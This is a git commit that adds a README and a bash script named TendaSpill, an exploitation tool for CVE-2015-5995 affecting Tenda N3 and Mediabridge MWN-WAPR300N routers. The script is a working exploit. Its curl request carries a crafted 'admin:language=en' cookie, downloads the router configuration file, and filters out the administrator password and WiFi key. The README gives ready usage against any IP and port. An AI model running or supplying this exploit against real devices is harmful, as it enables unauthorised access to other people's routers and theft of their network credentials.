4d55aab739c2c8e9beb357a8ede14e9cc63702da
Shahee Mirza <shaheemirza@users.noreply.github.com>
2018-10-05 00:26:11 +0600

    Add files via upload

---
+++ README.md
@@ -0,0 +1,39 @@
+# TendaSpill
+
+An exploitation tool to extract passwords using CVE-2015-5995.
+
+
+### CVE-2015-5995
+
+Mediabridge Medialink MWN-WAPR300N devices with firmware 5.07.50 and Tenda N3 Wireless N150 devices allow remote attackers to obtain administrative access via a certain admin substring in an HTTP Cookie header.
+
+
+## Disclaimer
+
+This tool is for testing and educational purposes only. Any other usage for this code is not allowed. Use at your own risk. The author or any Internet provider bears NO responsibility for misuse of this tool. By using this you accept the fact that any damage caused by the use of this tool is your responsibility.
+
+"In the end, we're all alone. And no one's coming to save you." 
+-John Reese, Person of Interest.
+
+
+## Interesting Read
+
+https://hk.saowen.com/a/31cc238470dacd72b1775a20c84fbd73f6d818ff6063bb23e7bfad387a43ccec
+
+
+## How to use
+
+```
+$ bash tendaspill.sh IP:PORT
+$ bash tendaspill.sh 192.168.1.1:8080
+```
+
+## Contributing
+
+Go ahead! you know what to do.
+
+
+
+## License
+
+The source code is licensed under the MIT license.
---
+++ tendaspill.sh
@@ -0,0 +1,53 @@
+#!/bin/bash
+
+IP=$1
+echo ""
+echo ""
+echo "#######                              #####                         
+   #    ###### #    # #####    ##   #     # #####  # #      #      
+   #    #      ##   # #    #  #  #  #       #    # # #      #      
+   #    #####  # #  # #    # #    #  #####  #    # # #      #      
+   #    #      #  # # #    # ######       # #####  # #      #      
+   #    #      #   ## #    # #    # #     # #      # #      #      
+   #    ###### #    # #####  #    #  #####  #      # ###### ######"
+echo "--------------------------------------------"
+
+echo "An exploitation tool to extract passwords using CVE-2015-5995."
+
+echo "by Shahee Mirza ## Twitter: @shaheemirza"
+
+echo "--------------------------------------------"
+
+if [ -z "$IP" ]
+then
+echo "++++++++++++++++++++++++++++++++++++++++++++"
+      echo "USES: ./tendaspill.sh IP:PORT"
+      echo "E.G.: ./tendaspill.sh 192.168.1.1:8080"
+echo "++++++++++++++++++++++++++++++++++++++++++++"
+exit
+fi
+
+echo ""
+
+echo "Exploiting: $IP"
+
+echo ""
+
+echo "++++++++++++++++++++++++++++++++++++++++++++"
+
+echo "Administrative and WiFi Password:"
+
+echo "++++++++++++++++++++++++++++++++++++++++++++"
+
+echo ""
+curl -s -k  -X $'GET' \
+    -H $'Host: '$IP -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US;q=0.6,en;q=0.4' -H $'Referer: http://'$IP'/' -H $'User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1' -H $'Cookie: language=en; admin:language=en' -H $'Connection: close' \
+    -b $'language=en; admin:language=en' \
+    $'http://'$IP'/cgi-bin/DownloadCfg/RouterCfm.cfg' 2>&1 | grep 'http_passwd\|wl_wpa_psk'
+
+echo ""
+
+echo "--------------------------------------------"
+
+echo ""
+
